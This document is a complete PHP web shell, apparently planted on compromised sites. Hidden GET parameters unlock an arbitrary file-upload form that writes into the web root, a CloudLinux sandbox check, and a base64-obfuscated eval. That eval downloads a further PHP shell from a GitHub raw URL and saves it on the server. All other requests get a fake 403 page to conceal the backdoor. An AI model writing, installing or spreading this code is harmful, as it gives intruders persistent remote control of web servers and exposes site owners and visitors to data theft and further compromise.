<?php
error_reporting(0);

if(isset($_GET["Chitoge"])) {
    echo "<h1><i>Chitoge kirisaki <3</i></h1><br>";
    echo "<b><phpuname>".php_uname()."</phpuname></b><br>";
    echo "<form method='post' enctype='multipart/form-data'>
          <input type='file' name='idx_file'>
          <input type='submit' name='upload' value='upload'>
          </form>";
    $root = $_SERVER['DOCUMENT_ROOT'];
    $files = $_FILES['idx_file']['name'];
    $dest = $root.'/'.$files;
    if(isset($_POST['upload'])) {
        if(is_writable($root)) {
            if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
                $web = "http://".$_SERVER['HTTP_HOST'];
                echo "Sukses -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
            } else {
                echo "gagal upload di document root.";
            }
        } else {
            if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
                echo "sukses upload <b>$files</b> di folder ini";
            } else {
                echo "gagal upload";
            }
        }
    }
} elseif(isset($_GET["Kirisaki"])){
	$homee = $_SERVER['DOCUMENT_ROOT'];
	$cgfs = explode("/",$homee);
	$build = '/'.$cgfs[1].'/'.$cgfs[2].'/.cagefs';
	if(is_dir($build)) {
		echo("CloudLinux => True");
	} else {
		echo("CloudLinux => False");
	}
} elseif (isset($_GET['Gorila'])) {
	eval(base64_decode('ZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CiAgICAgICAgJGZwID0gZm9wZW4oJGlzaSwgInciKTsKICAgICAgICAkY2ggPSBjdXJsX2luaXQoKTsKICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQklOQVJZVFJBTlNGRVIsIHRydWUpOwogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7CiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZJTEUsICRmcCk7CiAgICAgICAgcmV0dXJuIGN1cmxfZXhlYygkY2gpOwogICAgICAgIGN1cmxfY2xvc2UoJGNoKTsKICAgICAgICBmY2xvc2UoJGZwKTsKICAgICAgICBvYl9mbHVzaCgpOwogICAgICAgIGZsdXNoKCk7Cn0KaWYoYWRtaW5lcignaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FuZHJveGdoMHN0L2p1c3QtZm9yLWZ1bi9tYXN0ZXIvd3AucGhwJywnd3AucGhwJykpIHsKICAgICAgICBlY2hvICJ3aWJ1aGVrZXIub3JnIjsKfSBlbHNlIHsKICAgICAgICBlY2hvICJsb2NhbGhvc3QiOwp9'));
} else {
    header('HTTP/1.1 403 Forbidden');
}
?>
